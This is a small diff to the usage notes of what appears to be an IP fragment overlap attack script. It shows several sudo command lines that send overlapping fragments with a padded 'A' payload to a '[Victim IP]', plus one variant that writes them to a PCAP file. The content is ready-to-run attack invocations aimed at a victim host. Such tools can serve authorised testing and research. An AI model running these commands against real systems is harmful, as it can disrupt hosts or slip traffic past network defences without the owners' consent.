@@ -46,7 +46,9 @@ sudo ./ip_fragment_overlap_attack.py --dst [Victim IP] --count 1 --payload "$(py
 sudo ./ip_fragment_overlap_attack.py --dst [Victim IP] --count 1 --payload "$(python3 -c 'print("A"*3000)')" --multipleoverlap --fragsize 640 --id 43601
 
 # Write fragments to a PCAP instead of sending on-wire
-sudo ./ip_fragment_overlap_attack.py --dst 192.168.19.174 --multipleoverlap -f --fragsize 32 --count 1 --pcap-out fragments.pcap
+
+sudo ./ip_fragment_overlap_attack.py --dst [Victim IP] --count 1 --payload "$(python3 -c 'print("A"*3000)')" --multipleoverlap --fragsize 640 --id 43601 --pcap-out fragments.pcap
+
 
 
 # Important flags (high-level)
